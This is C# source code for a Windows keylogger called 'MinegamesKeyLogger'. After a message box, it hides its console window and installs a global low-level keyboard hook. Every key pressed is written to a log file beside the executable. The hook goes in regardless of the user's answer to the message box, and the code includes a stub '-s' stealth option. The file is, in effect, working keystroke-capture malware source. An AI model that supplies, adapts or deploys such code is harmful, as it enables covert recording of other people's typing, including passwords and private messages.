using System;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace MinegamesKeyLogger
{
    static class Program
    {
        static void Main(string[] args)
        {
            MessageBox.Show("This program will only log your pc keys just to make sure that you will not use it for malicious purposes! everykey will be monitored to the place the application started. you can always end this program task.", "MinegamesKeylogger", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);

            if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + @"\MinegamesLog.log"))
            {
                File.WriteAllText(Path.GetDirectoryName(Application.ExecutablePath) + @"\MinegamesLog.log", "");
            }

            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);

            bool stealth = false;

            try
            {
                string stealthCheck = args[0];
                if (stealthCheck == "-s")
                {
                    stealth = true;
                }
            }
            catch
            {
                // Don't do anything!
            }

            if (stealth == false)
            {
                
            }

            Application.Run();

            UnhookWindowsHookEx(_hookID);
        }

        private const int WH_KEYBOARD_LL = 13;

        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())

            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\MinegamesLog.log", true);

                string key = Convert.ToString((Keys)vkCode);

                sw.Write(key + " ");

                sw.Close();
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}